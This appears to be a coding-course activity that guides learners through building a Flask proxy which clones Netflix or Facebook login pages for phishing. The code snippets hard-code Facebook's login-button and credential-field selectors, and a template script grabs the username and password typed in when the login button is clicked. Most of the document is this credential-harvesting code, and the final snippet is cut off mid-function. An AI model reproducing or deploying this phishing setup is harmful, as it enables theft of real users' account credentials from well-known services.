Clone Multiple Web Pages
===================








In this activity, you will learn to clone multiple websites.








<img src= "https://s3.amazonaws.com/media-p.slid.es/uploads/1525749/images/10986008/C123_full_activity.gif" width = "100%" height = "auto">




Follow the given steps to complete this activity:




1. Create ids for the web page components.
* Open the files `proxy-server.py`.
* Create ids for the web page components by declaring the variables globally.
~~~python
target_url = None
login_button = None
user_name_field = None
password_field = None


~~~




2. Set the ids to the user's choice.




* Set the ids by requesting and assigning the ids of the components to the user's choice.
* Use the inspect option to check the id of the login button and input fields.
~~~python
choice = input("Choose any one of the following options for phishing: \n 1. Netflix \n 2. Facebook")
. . .
. . .
elif choice == "2":
    target_url = "https://www.facebook.com"
    login_button = "._42ft"
    user_name_field = "#email"
    password_field = "#pass"
    print("Phishing for Facebook")
else:
    exit()
~~~
3. Pass the ids to the proxy server.




* Pass the ids to the proxy server by passing the values while rendering the HTML template.
~~~python
@app.route('/', methods=['GET', 'POST'])
def serve_index():
    return render_template('index.html',
                      login_button = login_button,
                      user_name_field = user_name_field,
                      password_field = password_field,
                      target_url = target_url)
~~~
4. Receive the ids on the server.




* Receive the ids on the server by replacing the fields with the rendered data using Jinja.
* Open the `index.html` file.
~~~sh
function display_html() {
  $("body").append(html);
  $("{{login_button}}").click(function(){
 
  var userLoginId  = $("{{user_name_field}}").val();
  var userPassword = $("{{password_field}}").val();
~~~
* Save and run the code to check the output.
